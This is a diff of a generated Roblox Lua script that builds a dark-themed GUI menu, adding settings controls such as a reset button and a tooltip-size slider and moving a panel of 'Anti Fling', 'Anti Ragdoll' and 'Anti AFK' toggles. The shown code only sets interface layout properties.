+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button
+G2L["108"] = Instance.new("TextButton", G2L["107"]);
+G2L["108"]["BorderSizePixel"] = 0;
+G2L["108"]["TextTransparency"] = 1;
+G2L["108"]["TextSize"] = 14;
+G2L["108"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["108"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["108"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["108"]["ZIndex"] = 99;
+G2L["108"]["BackgroundTransparency"] = 1;
+G2L["108"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["108"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["108"]["Name"] = [[button]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.button.toggleFrame
-G2L["109"] = Instance.new("Frame", G2L["107"]);
-G2L["109"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["109"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["109"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["109"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["109"]["Name"] = [[toggleFrame]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button.UIPadding
+G2L["109"] = Instance.new("UIPadding", G2L["108"]);
+G2L["109"]["PaddingTop"] = UDim.new(0, 2);
+G2L["109"]["PaddingRight"] = UDim.new(0, 3);
+G2L["109"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["109"]["PaddingBottom"] = UDim.new(0, 2);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.button.toggleFrame.outlineStroke
-G2L["10a"] = Instance.new("UIStroke", G2L["109"]);
-G2L["10a"]["Thickness"] = 2;
-G2L["10a"]["Name"] = [[outlineStroke]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button.buttonFrame
+G2L["10a"] = Instance.new("Frame", G2L["108"]);
+G2L["10a"]["ZIndex"] = 99;
+G2L["10a"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["10a"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["10a"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["10a"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["10a"]["Name"] = [[buttonFrame]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.button.toggleFrame.toggleFade
-G2L["10b"] = Instance.new("CanvasGroup", G2L["109"]);
-G2L["10b"]["BorderSizePixel"] = 0;
-G2L["10b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["10b"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["10b"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["10b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["10b"]["Name"] = [[toggleFade]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button.buttonFrame.outlineStroke
+G2L["10b"] = Instance.new("UIStroke", G2L["10a"]);
+G2L["10b"]["Thickness"] = 2;
+G2L["10b"]["Name"] = [[outlineStroke]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.button.toggleFrame.toggleFade.UIGradient
-G2L["10c"] = Instance.new("UIGradient", G2L["10b"]);
-G2L["10c"]["Rotation"] = 90;
-G2L["10c"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button.buttonFrame.buttonFade
+G2L["10c"] = Instance.new("CanvasGroup", G2L["10a"]);
+G2L["10c"]["BorderSizePixel"] = 0;
+G2L["10c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["10c"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["10c"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["10c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["10c"]["Name"] = [[buttonFade]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.text
-G2L["10d"] = Instance.new("TextLabel", G2L["106"]);
-G2L["10d"]["TextWrapped"] = true;
-G2L["10d"]["ZIndex"] = 10;
-G2L["10d"]["BorderSizePixel"] = 0;
-G2L["10d"]["TextSize"] = 14;
-G2L["10d"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["10d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["10d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["10d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["10d"]["BackgroundTransparency"] = 1;
-G2L["10d"]["Size"] = UDim2.new(0, 155, 0, 20);
-G2L["10d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["10d"]["Text"] = [[Anti Fling]];
-G2L["10d"]["Name"] = [[text]];
-G2L["10d"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button.buttonFrame.buttonFade.UIGradient
+G2L["10d"] = Instance.new("UIGradient", G2L["10c"]);
+G2L["10d"]["Rotation"] = 90;
+G2L["10d"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.text.UIPadding
-G2L["10e"] = Instance.new("UIPadding", G2L["10d"]);
-G2L["10e"]["PaddingLeft"] = UDim.new(0, 5);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button.text
+G2L["10e"] = Instance.new("TextLabel", G2L["108"]);
+G2L["10e"]["ZIndex"] = 101;
+G2L["10e"]["BorderSizePixel"] = 0;
+G2L["10e"]["TextSize"] = 14;
+G2L["10e"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["10e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["10e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["10e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["10e"]["BackgroundTransparency"] = 1;
+G2L["10e"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["10e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["10e"]["Text"] = [[Reset to Default]];
+G2L["10e"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.text.text
-G2L["10f"] = Instance.new("UIStroke", G2L["10d"]);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button.text.text
+G2L["10f"] = Instance.new("UIStroke", G2L["10e"]);
 G2L["10f"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.UIPadding
-G2L["110"] = Instance.new("UIPadding", G2L["106"]);
-G2L["110"]["PaddingLeft"] = UDim.new(0, 2);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.fillbar
+G2L["110"] = Instance.new("Frame", G2L["107"]);
+G2L["110"]["ZIndex"] = 100;
+G2L["110"]["BorderSizePixel"] = 0;
+G2L["110"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["110"]["Size"] = UDim2.new(0, 0, 1, 0);
+G2L["110"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["110"]["Name"] = [[fillbar]];
+G2L["110"]["BackgroundTransparency"] = 0.95;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll
-G2L["111"] = Instance.new("Frame", G2L["f4"]);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize
+G2L["111"] = Instance.new("Frame", G2L["e2"]);
+G2L["111"]["ZIndex"] = 99;
 G2L["111"]["BorderSizePixel"] = 0;
 G2L["111"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["111"]["Size"] = UDim2.new(1, 0, 0, 20);
-G2L["111"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["111"]["Size"] = UDim2.new(1, 0, 0, 15);
+G2L["111"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
 G2L["111"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["111"]["Name"] = [[ragdoll]];
+G2L["111"]["Name"] = [[tooltipsize]];
 G2L["111"]["LayoutOrder"] = 4;
 G2L["111"]["BackgroundTransparency"] = 1;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.button
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button
 G2L["112"] = Instance.new("TextButton", G2L["111"]);
 G2L["112"]["BorderSizePixel"] = 0;
 G2L["112"]["TextTransparency"] = 1;
@@ -2593,2486 +2582,2498 @@ G2L["112"]["TextSize"] = 14;
 G2L["112"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["112"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["112"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["112"]["ZIndex"] = 50;
+G2L["112"]["ZIndex"] = 99;
 G2L["112"]["BackgroundTransparency"] = 1;
-G2L["112"]["Size"] = UDim2.new(0, 20, 0, 20);
+G2L["112"]["Size"] = UDim2.new(1, 0, 1, 0);
 G2L["112"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["112"]["Name"] = [[button]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.button.UIPadding
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.UIPadding
 G2L["113"] = Instance.new("UIPadding", G2L["112"]);
-G2L["113"]["PaddingTop"] = UDim.new(0, 3);
+G2L["113"]["PaddingTop"] = UDim.new(0, 2);
 G2L["113"]["PaddingRight"] = UDim.new(0, 3);
 G2L["113"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["113"]["PaddingBottom"] = UDim.new(0, 3);
+G2L["113"]["PaddingBottom"] = UDim.new(0, 2);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.button.toggleFrame
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.sliderFrame
 G2L["114"] = Instance.new("Frame", G2L["112"]);
 G2L["114"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
 G2L["114"]["BorderMode"] = Enum.BorderMode.Inset;
 G2L["114"]["Size"] = UDim2.new(1, 0, 1, 0);
 G2L["114"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["114"]["Name"] = [[toggleFrame]];
+G2L["114"]["Name"] = [[sliderFrame]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.button.toggleFrame.outlineStroke
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.sliderFrame.outlineStroke
 G2L["115"] = Instance.new("UIStroke", G2L["114"]);
 G2L["115"]["Thickness"] = 2;
 G2L["115"]["Name"] = [[outlineStroke]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.button.toggleFrame.toggleFade
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.sliderFrame.buttonFade
 G2L["116"] = Instance.new("CanvasGroup", G2L["114"]);
 G2L["116"]["BorderSizePixel"] = 0;
 G2L["116"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["116"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["116"]["Size"] = UDim2.new(1, 0, 1, 0);
 G2L["116"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["116"]["Name"] = [[toggleFade]];
+G2L["116"]["Name"] = [[buttonFade]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.button.toggleFrame.toggleFade.UIGradient
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.sliderFrame.buttonFade.UIGradient
 G2L["117"] = Instance.new("UIGradient", G2L["116"]);
 G2L["117"]["Rotation"] = 90;
 G2L["117"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.text
-G2L["118"] = Instance.new("TextLabel", G2L["111"]);
-G2L["118"]["TextWrapped"] = true;
-G2L["118"]["ZIndex"] = 10;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.sliderFrame.fillbar
+G2L["118"] = Instance.new("Frame", G2L["114"]);
+G2L["118"]["ZIndex"] = 5;
 G2L["118"]["BorderSizePixel"] = 0;
-G2L["118"]["TextSize"] = 14;
-G2L["118"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["118"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["118"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["118"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["118"]["BackgroundTransparency"] = 1;
-G2L["118"]["Size"] = UDim2.new(0, 155, 0, 20);
+G2L["118"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
+G2L["118"]["Size"] = UDim2.new(0.5, 0, 1, 0);
 G2L["118"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["118"]["Text"] = [[Anti Ragdoll]];
-G2L["118"]["Name"] = [[text]];
-G2L["118"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
+G2L["118"]["Name"] = [[fillbar]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.text.UIPadding
-G2L["119"] = Instance.new("UIPadding", G2L["118"]);
-G2L["119"]["PaddingLeft"] = UDim.new(0, 5);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.text
+G2L["119"] = Instance.new("TextLabel", G2L["112"]);
+G2L["119"]["ZIndex"] = 2;
+G2L["119"]["BorderSizePixel"] = 0;
+G2L["119"]["TextSize"] = 14;
+G2L["119"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["119"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["119"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["119"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["119"]["BackgroundTransparency"] = 1;
+G2L["119"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["119"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["119"]["Text"] = [[X/X]];
+G2L["119"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.text.text
-G2L["11a"] = Instance.new("UIStroke", G2L["118"]);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.text.text
+G2L["11a"] = Instance.new("UIStroke", G2L["119"]);
 G2L["11a"]["Name"] = [[text]];
 
 
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsizeLABEL
+G2L["11b"] = Instance.new("Frame", G2L["e2"]);
+G2L["11b"]["ZIndex"] = 99;
+G2L["11b"]["BorderSizePixel"] = 0;
+G2L["11b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["11b"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["11b"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
+G2L["11b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["11b"]["Name"] = [[tooltipsizeLABEL]];
+G2L["11b"]["LayoutOrder"] = 3;
+G2L["11b"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsizeLABEL.text
+G2L["11c"] = Instance.new("TextLabel", G2L["11b"]);
+G2L["11c"]["TextWrapped"] = true;
+G2L["11c"]["ZIndex"] = 99;
+G2L["11c"]["BorderSizePixel"] = 0;
+G2L["11c"]["TextSize"] = 14;
+G2L["11c"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["11c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["11c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["11c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["11c"]["BackgroundTransparency"] = 1;
+G2L["11c"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["11c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["11c"]["Text"] = [[Tooltip Size:]];
+G2L["11c"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsizeLABEL.text.UIPadding
+G2L["11d"] = Instance.new("UIPadding", G2L["11c"]);
+G2L["11d"]["PaddingLeft"] = UDim.new(0, 6);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsizeLABEL.text.text
+G2L["11e"] = Instance.new("UIStroke", G2L["11c"]);
+G2L["11e"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main
+G2L["11f"] = Instance.new("ScrollingFrame", G2L["34"]);
+G2L["11f"]["Visible"] = false;
+G2L["11f"]["Active"] = true;
+G2L["11f"]["BorderSizePixel"] = 0;
+G2L["11f"]["CanvasSize"] = UDim2.new(0, 0, 1.5, 0);
+G2L["11f"]["Name"] = [[Main]];
+G2L["11f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["11f"]["Size"] = UDim2.new(0, 360, 0, 255);
+G2L["11f"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["11f"]["Position"] = UDim2.new(0.01351, 0, 0.01887, 0);
+G2L["11f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["11f"]["ScrollBarThickness"] = 0;
+G2L["11f"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside
+G2L["120"] = Instance.new("Frame", G2L["11f"]);
+G2L["120"]["BorderSizePixel"] = 0;
+G2L["120"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["120"]["Size"] = UDim2.new(0, 176, 0, 255);
+G2L["120"]["Position"] = UDim2.new(0.51081, 0, 0, 0);
+G2L["120"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["120"]["Name"] = [[rightside]];
+G2L["120"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.UIListLayout
+G2L["121"] = Instance.new("UIListLayout", G2L["120"]);
+G2L["121"]["Padding"] = UDim.new(0, 5);
+G2L["121"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab
+G2L["122"] = Instance.new("Frame", G2L["120"]);
+G2L["122"]["BorderSizePixel"] = 0;
+G2L["122"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
+G2L["122"]["Size"] = UDim2.new(0, 176, 0, 160);
+G2L["122"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["122"]["Name"] = [[antiTab]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.antiScript
+G2L["123"] = Instance.new("LocalScript", G2L["122"]);
+G2L["123"]["Name"] = [[antiScript]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.UIListLayout
+G2L["124"] = Instance.new("UIListLayout", G2L["122"]);
+G2L["124"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
+G2L["124"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.greystroke
+G2L["125"] = Instance.new("UIStroke", G2L["122"]);
+G2L["125"]["ZIndex"] = 99;
+G2L["125"]["Color"] = Color3.fromRGB(51, 51, 51);
+G2L["125"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["125"]["Name"] = [[greystroke]];
+G2L["125"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.======ACCENT======
+G2L["126"] = Instance.new("Frame", G2L["122"]);
+G2L["126"]["BorderSizePixel"] = 0;
+G2L["126"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["126"]["Size"] = UDim2.new(1, 0, 0, 4);
+G2L["126"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["126"]["Name"] = [[======ACCENT======]];
+G2L["126"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.======ACCENT======.GuiColor
+G2L["127"] = Instance.new("Frame", G2L["126"]);
+G2L["127"]["BorderSizePixel"] = 0;
+G2L["127"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
+G2L["127"]["Size"] = UDim2.new(1, -2, 0, 2);
+G2L["127"]["Position"] = UDim2.new(0, 1, 0, 1);
+G2L["127"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["127"]["Name"] = [[GuiColor]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.======ACCENT======.GuiColor.UICorner
+G2L["128"] = Instance.new("UICorner", G2L["127"]);
+
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk
+G2L["129"] = Instance.new("Frame", G2L["122"]);
+G2L["129"]["BorderSizePixel"] = 0;
+G2L["129"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["129"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["129"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["129"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["129"]["Name"] = [[afk]];
+G2L["129"]["LayoutOrder"] = 2;
+G2L["129"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.button
+G2L["12a"] = Instance.new("TextButton", G2L["129"]);
+G2L["12a"]["BorderSizePixel"] = 0;
+G2L["12a"]["TextTransparency"] = 1;
+G2L["12a"]["TextSize"] = 14;
+G2L["12a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["12a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["12a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["12a"]["ZIndex"] = 50;
+G2L["12a"]["BackgroundTransparency"] = 1;
+G2L["12a"]["Size"] = UDim2.new(0, 20, 0, 20);
+G2L["12a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["12a"]["Name"] = [[button]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.button.UIPadding
+G2L["12b"] = Instance.new("UIPadding", G2L["12a"]);
+G2L["12b"]["PaddingTop"] = UDim.new(0, 3);
+G2L["12b"]["PaddingRight"] = UDim.new(0, 3);
+G2L["12b"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["12b"]["PaddingBottom"] = UDim.new(0, 3);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.button.toggleFrame
+G2L["12c"] = Instance.new("Frame", G2L["12a"]);
+G2L["12c"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["12c"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["12c"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["12c"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["12c"]["Name"] = [[toggleFrame]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.button.toggleFrame.outlineStroke
+G2L["12d"] = Instance.new("UIStroke", G2L["12c"]);
+G2L["12d"]["Thickness"] = 2;
+G2L["12d"]["Name"] = [[outlineStroke]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.button.toggleFrame.toggleFade
+G2L["12e"] = Instance.new("CanvasGroup", G2L["12c"]);
+G2L["12e"]["BorderSizePixel"] = 0;
+G2L["12e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["12e"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["12e"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["12e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["12e"]["Name"] = [[toggleFade]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.button.toggleFrame.toggleFade.UIGradient
+G2L["12f"] = Instance.new("UIGradient", G2L["12e"]);
+G2L["12f"]["Rotation"] = 90;
+G2L["12f"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.text
+G2L["130"] = Instance.new("TextLabel", G2L["129"]);
+G2L["130"]["TextWrapped"] = true;
+G2L["130"]["ZIndex"] = 10;
+G2L["130"]["BorderSizePixel"] = 0;
+G2L["130"]["TextSize"] = 14;
+G2L["130"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["130"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["130"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["130"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["130"]["BackgroundTransparency"] = 1;
+G2L["130"]["Size"] = UDim2.new(0, 155, 0, 20);
+G2L["130"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["130"]["Text"] = [[Anti AFK]];
+G2L["130"]["Name"] = [[text]];
+G2L["130"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.text.UIPadding
+G2L["131"] = Instance.new("UIPadding", G2L["130"]);
+G2L["131"]["PaddingLeft"] = UDim.new(0, 5);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.text.text
+G2L["132"] = Instance.new("UIStroke", G2L["130"]);
+G2L["132"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.UIPadding
